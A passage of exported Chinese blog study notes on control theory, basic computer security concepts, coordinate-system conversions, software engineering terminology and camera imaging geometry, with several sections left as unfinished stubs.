<h1 id="闭环控制"><a href="#闭环控制" class="headerlink" title="闭环控制"></a>闭环控制</h1><p align="center">
    <img src="images/closeloop.jpg" width="100%" alt="闭环控制系统"/>
</p>

<center>图1 闭环控制系统</center>

<p>图1所示闭环反馈控制系统包括了三种类型的输入信号和一个输出信号$Y(s)$，其中输入信号包括参考输入$R(s)$、干扰信号$T_d(s)$和测量误差$N(s)$。定义偏差信号，即跟踪误差信号为</p>
<p>$$E(s)=R(s)-Y(s)   \tag{1}$$</p>
<p>令$H(s)=1$，则图1所示闭环系统的输出$Y(s)$为</p>
<p>$$Y(s)=\frac{G_c(s)G(s)}{1+G_c(s)G(s)}R(s)+\frac{G(s)}{1+G_c(s)G(s)}T_d(s)-\frac{G_c(s)G(s)}{1+G_c(s)G(s)}N(s) \tag{2}$$</p>
<p>将式(1)代入式(2)，则跟踪误差信号$E(s)$为</p>
<p>$$E(s)=\frac{1}{1+G_c(s)G(s)}R(s)-\frac{G(s)}{1+G_c(s)G(s)}T_d(s)+\frac{G_c(s)G(s)}{1+G_c(s)G(s)}N(s) \tag{3}$$</p>
<p>定义开环增益$L(s)$为</p>
<p>$$L(s)=G_c(s)G(s) \tag{4}$$</p>
<p>定义灵敏度函数$S(s)$为</p>
<p>$$S(s)=\frac{1}{1+L(s)} \tag{5}$$</p>
<p>定义补灵敏度函数$C(s)$为</p>
<p>$$C(s)=\frac{L(s)}{1+L(s)}  \tag{6}$$</p>
<h1 id="初值定理"><a href="#初值定理" class="headerlink" title="初值定理"></a>初值定理</h1><p>在数学分析中，初值定理是将时间趋于零时的频域表达式与时域行为建立联系的定理。令</p>
<p>$$F(s)=\int _{0}^{\infty }f(t)e^dt$$</p>
<p>为 $ƒ(t)$ 的（单边）拉普拉斯变换。初值定理表明</p>
<p>$$\lim _{t\to 0}f(t)=\lim _{s\to \infty }{sF(s)}$$</p>
<h1 id="终值定理"><a href="#终值定理" class="headerlink" title="终值定理"></a>终值定理</h1><p>在数学分析中，终值定理（Final Value Theorem, FVT）是将时间趋于无穷时的时域表达式与频域行为建立联系的许多定理之一。终值定理允许直接对频域表达式取极限来计算时域行为，无需先转换到时域表达式再取极限。</p>
<p>在数学上，如果 </p>
<p>$$\lim _{t\to \infty }f(t)$$ </p>
<p>有一个有限极限，那么</p>
<p>$$\lim _{t\to \infty }f(t)=\lim _{s\to 0}{sF(s)}$$</p>
<p>其中 $F(s)$ 为  $f(t)$ 的（单边）拉普拉斯变换。</p>
<h1 id="增益裕度"><a href="#增益裕度" class="headerlink" title="增益裕度"></a>增益裕度</h1><p>增益裕度（gain margin, GM）是衡量系统稳定程度的一种方法。</p>
<h1 id="相位裕度"><a href="#相位裕度" class="headerlink" title="相位裕度"></a>相位裕度</h1><p>相位裕度（phase margin, PM）是另一种衡量系统稳定程度的方法。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://zhuanlan.zhihu.com/p/45493939" target="_blank" rel="noopener">一阶系统和二阶系统，了解一下！！！</a>,by 软软不软.</li>
<li><a href="https://zh.wikipedia.org/wiki/%E7%BB%88%E5%80%BC%E5%AE%9A%E7%90%86" target="_blank" rel="noopener">终值定理</a>,by wikipedia.</li>
<li><a href="https://zh.wikipedia.org/wiki/%E5%88%9D%E5%80%BC%E5%AE%9A%E7%90%86" target="_blank" rel="noopener">初值定理</a>,by wikipedia.</li>
<li><a href="https://zh.wikipedia.org/wiki/%E6%AC%A7%E6%8B%89%E5%85%AC%E5%BC%8F" target="_blank" rel="noopener">欧拉公式</a>,by wikipedia.</li>
<li><a href="https://zhuanlan.zhihu.com/p/41545813" target="_blank" rel="noopener">分部积分法（integration by parts）</a>,by 清雅白鹿记.</li>
<li><a href="https://zhuanlan.zhihu.com/p/55788744" target="_blank" rel="noopener">如何设计一个运动控制系统</a>,by J Pan.</li>
<li><a href="https://zhuanlan.zhihu.com/p/42615269" target="_blank" rel="noopener">如何入门自动控制理论</a>,by J Pan.</li>
<li><a href="https://zhuanlan.zhihu.com/p/32950045" target="_blank" rel="noopener">控制器设计怎么做</a>,by 刘扬扬.</li>
<li><a href="https://zh.wikipedia.org/wiki/%E9%98%BB%E5%B0%BC" target="_blank" rel="noopener">阻尼</a>,by wikipedia.</li>
<li><a href="https://zh.wikipedia.org/wiki/%E7%9B%B8%E4%BD%8D%E8%A3%95%E5%BA%A6" target="_blank" rel="noopener">相位裕度</a>,by wikipedia.</li>
<li><a href="https://zh.wikipedia.org/wiki/%E6%B3%A2%E5%BE%B7%E5%9C%96" target="_blank" rel="noopener">波德图</a>,by wikipedia.</li>
<li><a href="https://www.zhihu.com/question/27347401" target="_blank" rel="noopener">伯德图中的相角裕量和幅值裕量有什么物理意义？</a>,by zhihu.</li>
<li><a href="https://zhuanlan.zhihu.com/p/85931427" target="_blank" rel="noopener">现代控制理论线性系统入门(五)设计状态反馈控制器</a>,by zhihu.</li>
<li><a href="https://www.zhihu.com/question/56078156" target="_blank" rel="noopener">simulink怎么用s函数代替微分模块？</a>,by zhihu.</li>
<li><a href="https://zhuanlan.zhihu.com/p/85109935" target="_blank" rel="noopener">飞机的纵向增稳是如何实现的</a>,by J Pan.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>控制理论</tag>
      </tags>
  </entry>
  <entry>
    <title>计算机安全的理论知识笔记</title>
    <url>/2022/12/20/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%AE%89%E5%85%A8%E7%9A%84%E7%90%86%E8%AE%BA%E7%9F%A5%E8%AF%86%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<blockquote>
<p>计算机安全、网络安全（网络安全）或信息技术安全（IT 安全）是保护计算机系统和网络免受恶意行为者的攻击，这些攻击可能导致未经授权的信息泄露、盗窃或损坏硬件、软件或数据，以及他们提供的服务的中断或误导。</p>
</blockquote>
<h1 id="CIA三要素"><a href="#CIA三要素" class="headerlink" title="CIA三要素"></a>CIA三要素</h1><p>保密性又称机密性，其与Integrity（完整性）和 Availability（可用性）并称为信息安全的CIA三要素。</p>
<p>信息安全三要素之间存在互相牵制的关系，例如：过度强化机密性时，将造成完整性与可用性的降低，需要高可用性的系统则会造成机密性与完整性的降低，因此在有限资源的前提下，在信息安全三要素中获取适当的平衡是信息安全管理层次结构的重要课题。</p>
<h2 id="保密性"><a href="#保密性" class="headerlink" title="保密性"></a>保密性</h2><p>机密性（Confidentiality）确保资料传递与存储的隐密性，避免未经授权的用户有意或无意的揭露资料内容。</p>
<h2 id="完整性"><a href="#完整性" class="headerlink" title="完整性"></a>完整性</h2><p>完整性是指在传输、存储信息或数据的过程中，确保信息或数据不被未授权的篡改或在篡改后能够被迅速发现。在信息安全领域使用过程中，常常和保密性混淆。通常使用数字签名、散列函数等手段保證數據完整性。</p>
<h2 id="可用性"><a href="#可用性" class="headerlink" title="可用性"></a>可用性</h2><p>在信息安全领域，可用性（Availability）是成功的信息安全项目应具备的需求，意及当用户需透过信息系统进行操作时，资料与服务须保持可用状况(能用)，并能满足使用需求(够用)。</p>
<h1 id="认证、授权和记录"><a href="#认证、授权和记录" class="headerlink" title="认证、授权和记录"></a>认证、授权和记录</h1><h2 id="认证（Authentication）"><a href="#认证（Authentication）" class="headerlink" title="认证（Authentication）"></a>认证（Authentication）</h2><p>识别信息用户的身份，可记录信息被谁所访问使用，例如：透过密码或证书方式验证用户身份。身份认证主要有三种方式：</p>
<ul>
<li>你所知道的（Something you know）：账号／密码</li>
<li>你所拥有的（Something you have）：IC卡、数字设备、数字签名、一次性密码(OTP)</li>
<li>你所具备的（Something you are）：指纹、虹膜、声纹、脸部特征、静脉脉纹、DNA</li>
</ul>
<h2 id="授权（Authorization）"><a href="#授权（Authorization）" class="headerlink" title="授权（Authorization）"></a>授权（Authorization）</h2><p>依照实际需求给予实体适当的权限，一般建议采最小权限（Least privilege），意即仅给予实际作业所需要的权限，避免过度授权可能造成的信息暴露或泄漏。</p>
<p>信息系统层面的实用访问控制方法分类如下：</p>
<ul>
<li>强制访问控制（Mandatory Access Control）</li>
<li>自由选定访问控制（Discretionary Access Control）</li>
<li>以角色为基础的访问控制（Role-Based Access Control）</li>
<li>以规则为基础的访问控制（Rule-Based Access Control）</li>
</ul>
<h2 id="纪录（Accounting）"><a href="#纪录（Accounting）" class="headerlink" title="纪录（Accounting）"></a>纪录（Accounting）</h2><p>内容项目包含量测（Measuring）、监控（Monitoring）、报告（Reporting）与日志案(Logging)，以便提供未来作为审核（Auditing）、计费（Billing）、分析（Analysis）与管理之用，主要精神在于收集用户与系统之间交互的资料，并留下轨迹纪录。</p>
<h1 id="威胁建模"><a href="#威胁建模" class="headerlink" title="威胁建模"></a>威胁建模</h1><p>威胁建模是一个过程，通过该过程可以识别和列举潜在威胁，例如结构漏洞或缺乏适当的保护措施，并确定对策的优先级。威胁建模的目的是根据系统的性质、可能的攻击者概况、最可能的攻击向量以及攻击者最需要的资产，为防御者提供系统分析，说明需要包括哪些控制或防御措施攻击者。威胁建模回答诸如“我在哪里最容易受到攻击？”之类的问题，“最相关的威胁是什么？” ，以及“我需要做什么来防范这些威胁？”</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://www.bilibili.com/video/BV1EW411u7th" target="_blank" rel="noopener">Crash Course Computer Science</a>,by Crash Course.</li>
<li><a href="https://en.wikipedia.org/wiki/Computer_security" target="_blank" rel="noopener">Computer security</a>,by wikipedia.</li>
<li><a href="https://zh.wikipedia.org/wiki/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8" target="_blank" rel="noopener">信息安全</a>,by wikipedia.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>计算机安全</tag>
      </tags>
  </entry>
  <entry>
    <title>经纬高与北天东坐标之间的转换方法</title>
    <url>/2019/11/16/%E7%BB%8F%E7%BA%AC%E9%AB%98%E4%B8%8E%E5%8C%97%E5%A4%A9%E4%B8%9C%E5%9D%90%E6%A0%87%E4%B9%8B%E9%97%B4%E7%9A%84%E8%BD%AC%E6%8D%A2%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<p>经纬高是地理坐标系的表示方法，北天东则是一种直角坐标系。它们之间通过直角坐标系原点的经纬度联系起来，并可相互转换。下面介绍它们之间的转换方法。</p>
<h1 id="坐标系分类"><a href="#坐标系分类" class="headerlink" title="坐标系分类"></a>坐标系分类</h1><p>目前常用的坐标系统分成两种：地理坐标系和直角坐标系。下面分别介绍这两种坐标系。</p>
<h2 id="地理坐标系"><a href="#地理坐标系" class="headerlink" title="地理坐标系"></a>地理坐标系</h2><p>地理坐标系一般是指由经度、纬度和相对高度组成的坐标系，能够标示地球上的任何一个位置。经度和纬度常合称为经纬度，把球面上的经纬度显示在平面地图上需要采用某种地图投影。</p>
<p>地理坐标系的用途很广泛，例如天文学上常用的黄道坐标系、赤道坐标系同样也是一种地理坐标系。</p>
<h2 id="直角坐标系"><a href="#直角坐标系" class="headerlink" title="直角坐标系"></a>直角坐标系</h2><p>笛卡尔坐标系（英语：Cartesian coordinate system，也称直角坐标系）在数学中是一种正交坐标系，由法国数学家勒内·笛卡尔引入而有此名。</p>
<p>二维的直角坐标系通常由两个互相垂直的坐标轴设定，通常分别称为x-轴和 y-轴；两个坐标轴的相交点，称为原点，通常标记为O，既有“零”的意思，又是英语“Origin”的首字母。每一个轴都指向一个特定的方向。这两个不同线的坐标轴，决定了一个平面，称为xy-平面，又称为笛卡尔平面。通常两个坐标轴只要互相垂直，其指向何方对于分析问题是没有影响的，但习惯性地，x-轴被水平摆放，称为横轴，通常指向右方；y-轴被竖直摆放而称为纵轴，通常指向上方。两个坐标轴这样的位置关系，称为二维的右手坐标系，或右手系。</p>
<p>直角坐标系也可以推广至三维空间与高维空间 (higher dimension)。在原本的二维直角坐标系，再添加一个垂直于x-轴，y-轴的坐标轴，称为z-轴。假若，这三个坐标轴满足右手定则，则可得到三维的直角坐标系。这z-轴与x-轴，y-轴相互正交于原点。在三维空间的任何一点P，可以用直角坐标${\displaystyle (x,\ y,\ z)}$来表达其位置。</p>
<p>直角坐标系的用途非常广泛。例如天文学上常用的赤道直角坐标系、地平坐标系是一种直角坐标系。地心地固坐标系、北天东坐标系、北东地坐标系都是一种直角坐标系。</p>
<h1 id="转换方法"><a href="#转换方法" class="headerlink" title="转换方法"></a>转换方法</h1><p>经纬高与北天东的转换方法，通常通过地心地固坐标系作为中介进行转换。例如，经纬高转北天东，首先将经纬高转地心地固坐标系，再将地心地固坐标系转北天东坐标系。北天东转经纬高亦如此。</p>
<h2 id="经纬高转地心地固坐标系"><a href="#经纬高转地心地固坐标系" class="headerlink" title="经纬高转地心地固坐标系"></a>经纬高转地心地固坐标系</h2><p>地心地固坐标系的示意图如图1所示。</p>
<p align="center">
    <img src="images/ECEF.png" width="80%" alt="地心地固坐标系"/>
</p>
<center>图1 地心地固坐标系</center>

<h2 id="地心地固坐标系转北天东"><a href="#地心地固坐标系转北天东" class="headerlink" title="地心地固坐标系转北天东"></a>地心地固坐标系转北天东</h2><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://zh.wikipedia.org/wiki/%E5%9C%B0%E5%BF%83%E5%9C%B0%E5%9B%BA%E5%9D%90%E6%A0%87%E7%B3%BB" target="_blank" rel="noopener">地心地固坐标系</a>,by wikipedia.</li>
<li><a href="https://zh.wikipedia.org/wiki/%E5%9C%B0%E7%90%83%E6%A4%AD%E7%90%83" target="_blank" rel="noopener">地球椭球</a>,by wikipedia.</li>
<li><a href="http://qiancy.com/2017/01/07/datum-spheroid-parameters-equation/" target="_blank" rel="noopener">椭球体的重要参数和公式</a>,by 一灯.</li>
<li><a href="https://stackoverflow.com/questions/4679876/how-do-i-translate-of-lon-lat-coordinate-by-some-n-e-meters-distance-on-earth-su" target="_blank" rel="noopener">how do I translate of lon/lat coordinate by some N-E meters distance on earth surface?</a>,by stackoverflow.</li>
<li><a href="https://zh.wikipedia.org/wiki/%E7%AC%9B%E5%8D%A1%E5%B0%94%E5%9D%90%E6%A0%87%E7%B3%BB" target="_blank" rel="noopener">笛卡尔坐标系</a>,by wikipedia.</li>
<li><a href="https://zh.wikipedia.org/wiki/%E5%9C%B0%E7%90%86%E5%9D%90%E6%A0%87%E7%B3%BB" target="_blank" rel="noopener">地理坐标系</a>,by wikipedia.</li>
<li><a href="https://blog.csdn.net/liweihua0007/article/details/66970014" target="_blank" rel="noopener">ECEF坐标系</a>,by 深_蓝.</li>
<li><a href="https://en.wikipedia.org/wiki/Spatial_reference_system" target="_blank" rel="noopener">空间参考系统</a>,by wikipedia.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title>计算机科学术语辨析</title>
    <url>/2019/05/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E6%9C%AF%E8%AF%AD%E8%BE%A8%E6%9E%90/</url>
    <content><![CDATA[<p>计算机科学中的一些术语是同行之间进行交流的工具，但是这些术语约定俗成，缺乏权威定义，在不同的语境下有不同的涵义，不同的人有不同的理解，由此造成很多分歧。本文记录常用计算机科学术语，通过规范和校正其内涵和外延，避免分歧，提高效率。</p>
<h1 id="常用术语"><a href="#常用术语" class="headerlink" title="常用术语"></a>常用术语</h1><h2 id="架构"><a href="#架构" class="headerlink" title="架构"></a>架构</h2><p>软件架构是有关软件整体结构与组件的抽象描述，用于指导大型软件系统各个方面的设计。</p>
<p>软件架构是一个系统的草图，抽象层次高。软件架构描述的对象是直接构成系统的抽象组件。各个组件之间的连接则明确和相对细致地描述组件之间的通讯。在实现阶段，这些抽象组件被细化为实际的组件，比如具体某个类或者对象。在面向对象领域中，组件之间的连接通常用接口来实现。</p>
<h2 id="模式"><a href="#模式" class="headerlink" title="模式"></a>模式</h2><p>在软件工程中，设计模式（design pattern）是对软件设计中普遍存在（反复出现）的各种问题，所提出的解决方案。这个术语是由埃里希·伽玛（Erich Gamma）等人在1990年代从建筑设计领域引入到计算机科学的。</p>
<p>设计模式并不直接用来完成代码的编写，而是描述在各种不同情况下，要怎么解决问题的一种方案。面向对象设计模式通常以类别或对象来描述其中的关系和相互作用，但不涉及用来完成应用程序的特定类别或对象。设计模式能使不稳定依赖于相对稳定、具体依赖于相对抽象，避免会引起麻烦的紧耦合，以增强软件设计面对并适应变化的能力。</p>
<p>《设计模式》一书原先把设计模式分为创建型模式、结构型模式、行为型模式，把它们通过授权、聚合、诊断的概念来描述。</p>
<h2 id="模块"><a href="#模块" class="headerlink" title="模块"></a>模块</h2><p>模块，module，模块是一个通用概念，可能从功能或其他目的来区分。模块可以是子系统子领域，主要取决于上下文环境的用法。</p>
<p>通常我们会说程序模块，功能模块，这实际上是在按照不同的标准对模块的内容和范围的不同定义。</p>
<p>通常我们说的程序模块，是指的一段能够实现某个有价值目标的的成员代码段，这样的东西，我们还有另一个称呼：例程，而例程有两种，即函数和过程，它们都能实现一个有价值的目标供其它的模块使用。</p>
<p>而功能模块的说法一般在分析和设计阶段出现得比较频繁，通常我们用一个功能模块来说明一个功能所包含的系统行为，当我们觉得分析的颗粒度可能更大一些的时候我们可以用一个功能模块来表示一组功能的集合，这似乎让我们觉得，模块这个词的概念和“子系统”这个词的概念有些模糊，是的，事实上，有些大的模块会慢慢的让我们觉得称呼他们子系统更合适，或者一个子系统，我们会慢慢发现你还包含着一些模块。</p>
<p>但是无论怎样，定义模块的原则应该是：高内聚和低耦合。</p>
<h2 id="组件"><a href="#组件" class="headerlink" title="组件"></a>组件</h2><p>软件组件，定义为自包含的、可编程的、可重用的、与语言无关的软件单元。</p>
<h2 id="插件"><a href="#插件" class="headerlink" title="插件"></a>插件</h2><p>根据对组件和模块的分析，插件属于组件，而且还是一个程序模块，也是一个功能模块。插件是一种电脑程序，通过和应用程序的互动，来替应用程式增加一些特定的功能。 插件必须依赖于应用程序才能发挥自身功能，仅靠插件是无法正常运行的。</p>
<p>使用方法：满足一定接口规范的具有一定功能的程序模块。开发者可以在自己软件系统中设计相应的接口以匹配某个插件，也可以设计一定的接口规范，来让别人开发插件。插件和程序之间通过接口进行交互。</p>
<h2 id="控件"><a href="#控件" class="headerlink" title="控件"></a>控件</h2><p>可视化的组件。</p>
<h2 id="中间件"><a href="#中间件" class="headerlink" title="中间件"></a>中间件</h2><p>中间件是提供系统软件和应用软件之间连接的软件，以便于软件各部件之间的沟通。</p>
<h1 id="术语辨析"><a href="#术语辨析" class="headerlink" title="术语辨析"></a>术语辨析</h1><h2 id="面向对象编程-VS-面向过程编程-VS-面向切面编程"><a href="#面向对象编程-VS-面向过程编程-VS-面向切面编程" class="headerlink" title="面向对象编程 VS 面向过程编程 VS 面向切面编程"></a>面向对象编程 VS 面向过程编程 VS 面向切面编程</h2><p>面向过程(Procedure Oriented)是一种以过程为中心的编程思想。这些都是以什么正在发生为主要目标进行编程，不同于面向对象的是谁在受影响。与面向对象明显的不同就是封装、继承、类。</p>
<p>面向对象编程（Object Oriented Programming，OOP，面向对象程序设计）是一种计算机编程架构。OOP 的一条基本原则是计算机程序是由单个能够起到子程序作用的单元或对象组合而成。OOP 达到了软件工程的三个主要目标：重用性、灵活性和扩展性。为了实现整体运算，每个对象都能够接收信息、处理数据和向其它对象发送信息。</p>
<p>面向切面编程（Aspect Oriented Programming(AOP)），是一个比较热门的话题。AOP主要实现的目的是针对业务处理过程中的切面进行提取，它所面对的是处理过程中的某个步骤或阶段，以获得逻辑过程中各部分之间低耦合性的隔离效果。</p>
<p>面向过程编程围绕行为组织事物，面向对象编程围绕事物组织行为，有没有类、有没有继承并不是两种编程方法差异的关键；</p>
<p>面向切面编程是横跨流程的，实现某个特定位置的功能，面向功能进行抽象。具体流程只需做引用即可，而不至于不同流程中冗余很多类似代码。</p>
<h2 id="组件化开发-VS-模块化开发"><a href="#组件化开发-VS-模块化开发" class="headerlink" title="组件化开发 VS 模块化开发"></a>组件化开发 VS 模块化开发</h2><p>组件化和模块化的中心思想都是分而治之。目的都是将一个庞大的系统拆分成多个组件或者说是模块。</p>
<p>模块化就是将一个程序按照其功能做拆分，分成相互独立的模块，以便于每个模块只包含与其功能相关的内容。模块我们相对熟悉,比如登录功能可以是一个模块,搜索功能可以是一个模块,汽车的发送机也可是一个模块.</p>
<p>组件化就是基于可重用的目的，将一个大的软件系统按照分离关注点的形式，拆分成多个独立的组件，主要目的就是减少耦合.</p>
<p>一个独立的组件可以是一个软件包、web服务、web资源或者是封装了一些函数的模块。比如汽车的发动机是一个模块,也是一个组件,再或者前端中的一个日历控件是一个模块,也一个组件.这样，独立出来的组件可以单独维护和升级而不会影响到其他的组件.</p>
<p>组件和模块是一对容易混淆的名词,也常常被用来相互替换,两者是否有差异往往取决于专业背景、所在领域、以及视角。从设计上来看,组件强调复用,模块强调职责(内聚、分离),或者说组件是达到可复用要求的模块</p>
<p>模块化强调的是拆分，无论是从业务角度还是从架构、技术角度，模块化首先意味着将代码、数据等内容按照其职责不同分离，使其变得更加容易维护、迭代，使开发人员可以分而治之。</p>
<p>组件化则着重于可重用性，不管是界面上反复使用的用户头像按钮，还是处理数据的流程中的某个部件，只要可以被反复使用，并且进行了高度封装，只能通过接口访问，就可以称其为“组件”。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://zhuanlan.zhihu.com/p/28614088" target="_blank" rel="noopener">面向对象 vs 类与继承 vs 面向组件</a>, by 龙腾道默默地.</li>
<li><a href="https://zh.wikipedia.org/wiki/软件架构" target="_blank" rel="noopener">软件架构</a>,by wikipedia.</li>
<li><a href="http://www.ruanyifeng.com/blog/2016/09/software-architecture.html" target="_blank" rel="noopener">软件架构入门</a>,by 阮一峰.</li>
<li><a href="https://zh.wikipedia.org/wiki/设计模式_(计算机)" target="_blank" rel="noopener">设计模式</a>,by wikipedia.</li>
<li><a href="https://www.cnblogs.com/doit8791/p/6129963.html" target="_blank" rel="noopener">软件架构、框架、模式、模块、组件、插件概念汇总</a>,by 时间的朋友.</li>
<li><a href="https://gaodaxiu0406.github.io/2017/09/09/模块化与组件化/" target="_blank" rel="noopener">模块化与组件化</a>,by 滴答.</li>
<li><a href="https://blog.csdn.net/qq_29422251/article/details/76618460" target="_blank" rel="noopener">面向过程编程，面向对象编程和面向切面编程理解</a>, by 枫叶千言.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>软件工程</tag>
      </tags>
  </entry>
  <entry>
    <title>计算相机传感器分辨率和镜头焦距</title>
    <url>/2022/08/11/%E8%AE%A1%E7%AE%97%E7%9B%B8%E6%9C%BA%E4%BC%A0%E6%84%9F%E5%99%A8%E5%88%86%E8%BE%A8%E7%8E%87%E5%92%8C%E9%95%9C%E5%A4%B4%E7%84%A6%E8%B7%9D/</url>
    <content><![CDATA[<p>如何计算用于图像采集的正确镜头焦距和相机传感器分辨率？</p>
<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>首先，定义这些基本术语：</p>
<ul>
<li>视野 (FOV)：相机需要获取的被检查区域</li>
<li>最小特征：图像中要检测的最小特征的大小</li>
<li>工作距离（WD）：镜头前端到被检物体的距离</li>
</ul>
<p>请参考以下图片：</p>
<p align="center">
    <img src="images/one_20180215105020.jpg" width="90%" alt="相机成像示意图1"/>
</p>
<center>图1 相机成像示意图1</center>
<p align="center">
    <img src="images/Focal_Lenght_small.webp" width="90%" alt="相机成像示意图2"/>
</p>
<center>图2 相机成像示意图2</center>



<h1 id="参考连接"><a href="#参考连接" class="headerlink" title="参考连接"></a>参考连接</h1><ol>
<li><a href="https://www.ni.com/en-us/support/documentation/supplemental/18/calculating-camera-sensor-resolution-and-lens-focal-length.html" target="_blank" rel="noopener">Calculating Camera Sensor Resolution and Lens Focal Length</a>,by ni.com.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>计算机视觉</tag>
      </tags>
  </entry>
  <entry>
    <title>计算机视觉之相机成像原理与坐标系转换</title>
    <url>/2018/11/19/%E8%AE%A1%E7%AE%97%E6%9C%BA%E8%A7%86%E8%A7%89%E4%B9%8B%E7%9B%B8%E6%9C%BA%E6%88%90%E5%83%8F%E5%8E%9F%E7%90%86%E4%B8%8E%E5%9D%90%E6%A0%87%E7%B3%BB%E8%BD%AC%E6%8D%A2/</url>
    <content><![CDATA[<p>计算机视觉是一门研究用摄影机和计算机代替人眼对目标进行识别、跟踪和测量的学科。为了解该门学科，首先应掌握投影原理和世界坐标系、相机坐标系、图像坐标系、像素坐标系之间的转换关系。</p>
<h1 id="三维投影"><a href="#三维投影" class="headerlink" title="三维投影"></a>三维投影</h1><p>计算机3D图形学中，三维投影是将三维空间中的点映射到二维平面上的方法。常用三维投影有正交投影和透视投影。正交投影通常用于对现实物品的三维建模，而透视投影与人的视觉系统类似，常用于在二维平面呈现三维世界。</p>
<h2 id="正交投影原理"><a href="#正交投影原理" class="headerlink" title="正交投影原理"></a>正交投影原理</h2><p>正交投影是一系列用于显示三维物体的轮廓、细节或精确测量结果的变换方法。通常又称作截面图、鸟瞰图或立面图。</p>
<p>当视平面的法向（即摄像机的朝向）平行于笛卡尔坐标系三根坐标轴中的一根，数学变换定义如下： 若使用一个平行于y轴（侧视图）的正交投影将三维点 $a_{x}$, $a_{y}$,$a_{z}$投影到二维平面上得到二维点 $b_{x}$,$b_{y}$，可以使用如下公式</p>
<p>$$b_x=s_xa_x+c_x$$<br>$$b_y=s_za_z+c_z$$</p>
<p>其中向量s是一个任意的缩放因子，而c是一个任意的偏移量。这些常量可自由选择，通常用于将视口调整到一个合适的位置。该投影变换同样可以使用矩阵表示（为清晰起见引入临时向量d）</p>
<p>$$<br>\begin{bmatrix}<br>    d_x  \<br>    d_y  \<br>\end{bmatrix}<br>=<br>\begin{bmatrix}<br>    1 &amp; 0 &amp; 0 \<br>    0 &amp; 0 &amp; 1 \<br>\end{bmatrix}<br>\begin{bmatrix}<br>    a_x \<br>    a_y \<br>    a_z \<br>\end{bmatrix}<br>$$<br>$$<br>\begin{bmatrix}<br>    b_x\<br>    b_y\<br>\end{bmatrix}<br>=<br>\begin{bmatrix}<br>    s_x &amp; 0 \<br>    0     &amp; s_z \<br>\end{bmatrix}<br>\begin{bmatrix}<br>    d_x\<br>    d_y\<br>\end{bmatrix}<br>+<br>\begin{bmatrix}<br>    c_x\<br>    c_z\<br>\end{bmatrix}<br>$$<br>虽然正交投影产生的图像在一定程度上反映了物体的三维特性，但此类投影图像和实际观测到的并不相同。特别是对于相同长度的平行线段，无论离虚拟观察者（摄像机）远近与否，它们都会在正交投影中显示为相同长度。这会导致较近的线段看起来被缩短了。</p>
<h2 id="透视投影原理"><a href="#透视投影原理" class="headerlink" title="透视投影原理"></a>透视投影原理</h2><p>透视投影是为了获得接近真实三维物体的视觉效果而在二维的纸或者画布平面上绘图或者渲染的一种方法，它也称为透视图。透视投影的绘制必须根据已有的几何规则进行。</p>
<p>常用的透视投影视椎体模型如图1所示。设视点E位于原点，视平面P垂直于Z轴，且四边分别平行于x轴和y轴，视椎体的近截面离视点的距离为n，远截面离视点的距离为f，且一般取近截面为视平面。</p>
<p align="center">
    <img src="images/perspective_model.jpg" width="90%" alt="透视投影的标准视椎体模型"/>
</p>
<center>图1 透视投影的标准视椎体模型</center>

<h1 id="坐标系之间的转换"><a href="#坐标系之间的转换" class="headerlink" title="坐标系之间的转换"></a>坐标系之间的转换</h1><p>计算机视觉通常涉及到四个坐标系：像素平面坐标系（u,v）、像平面坐标系（图像物理坐标第（x,y）、相机坐标系（Xc,Yc,Zc）和世界坐标系（Xw,Yw,Zw），如图2所示。</p>
<p align="center">
    <img src="images/four_axis.png" width="90%" alt="四个坐标系"/>
</p>
<center>图2 四个坐标系</center>

<p>1 : 世界坐标系：根据情况而定，可以表示任何物体。单位m。</p>
<p>2：相机坐标系：以摄像机光心为原点（在针孔模型中也就是针孔为光心），z轴与光轴重合也就是z轴指向相机的前方（也就是与成像平面垂直），x轴与y轴的正方向与物体坐标系平行，其中上图中的f为摄像机的焦距。单位m</p>
<p>3：图像物理坐标系（也叫平面坐标系）：用物理单位表示像素的位置，坐标原点为摄像机光轴与图像物理坐标系的交点位置。坐标系为图上o-xy。单位是mm。单位毫米的原因是此时由于相机内部的CCD传感器是很小的，比如8mm x 6mm。但是最后图像照片是也像素为单位比如640x480.这就涉及到了图像物理坐标系与像素坐标系的变换了。下面的像素坐标系将会讲到。</p>
<p>4：像素坐标系：以像素为单位，坐标原点在左上角。这也是一些opencv，OpenGL等库的坐标原点选在左上角的原因。当然明显看出CCD传感器以mm单位到像素中间有转换的。举个例子，CCD传感上上面的8mm x 6mm，转换到像素大小是640x480. 假如dx表示像素坐标系中每个像素的物理大小就是1/80. 也就是说毫米与像素点的之间关系是piexl/mm.</p>
<h2 id="世界坐标系到相机坐标系的转换"><a href="#世界坐标系到相机坐标系的转换" class="headerlink" title="世界坐标系到相机坐标系的转换"></a>世界坐标系到相机坐标系的转换</h2><p>物体之间的坐标系变换都可以表示坐标系的旋转变换加上平移变换，则世界坐标系到相机坐标系的转换关系也是如此，他们之间的变换如图3所示。</p>
<p align="center">
    <img src="images/worldtocamera.jpg" width="90%" alt="世界坐标系到相机坐标系的转换"/>
</p>
<center>图3 世界坐标系到相机坐标系的转换</center>

